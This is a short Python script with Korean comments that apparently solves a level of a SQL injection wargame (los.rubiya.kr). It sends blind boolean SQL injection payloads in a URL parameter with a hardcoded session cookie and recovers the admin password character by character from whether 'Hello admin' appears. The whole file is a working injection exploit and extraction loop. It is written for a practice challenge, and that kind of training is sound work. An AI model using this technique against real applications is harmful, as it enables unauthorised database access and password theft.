# -*- coding: utf-8 -*-
import urllib.request

answer = ""
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

for i in range(1, 9):
    try:
        for j in range(32, 129):
            url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=%27||length(pw)%3C10%26%26ascii(substring(pw,'
            url = url + str(i) + ',1))<' + str(j) + '--+'

            print(url)

            req = urllib.request.Request(url) #엔터 치기전 상태
            req.add_header('User-agent', user_agent) #헤더값 설정(los가 뱉어냄)
            req.add_header("Cookie", "PHPSESSID=res07ef6n87pg7clg2q6hfi3cd")

            res = urllib.request.urlopen(req) # 엔터누른 효과
            data = res.read().decode('utf-8') # 본문만 가져오기

            if data.find('<h2>Hello admin</h2>') != -1:
                print(chr(j-1))
                answer = answer + chr(j-1)
                break
    except Exception as e:
        continue

print(answer)
